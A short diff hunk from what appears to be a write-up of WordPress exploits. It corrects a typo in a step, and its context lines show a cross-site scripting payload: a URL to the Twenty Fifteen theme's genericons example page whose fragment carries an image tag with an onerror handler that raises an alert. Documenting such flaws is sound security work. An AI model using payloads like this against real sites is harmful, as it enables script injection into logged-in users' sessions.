@@ -79,7 +79,7 @@ Step by step:
 ```html
 http://wpdistillery.vm/wp-content/themes/twentyfifteen/genericons/example.html#<img/src/onerror=alert("You_are_hacked!")>
 ```
-2. When logge in, copy the link to the browser and press Enter
+2. When logged in, copy the link to the browser and press Enter
 
 # Wordpress exploit #4
 Type: 
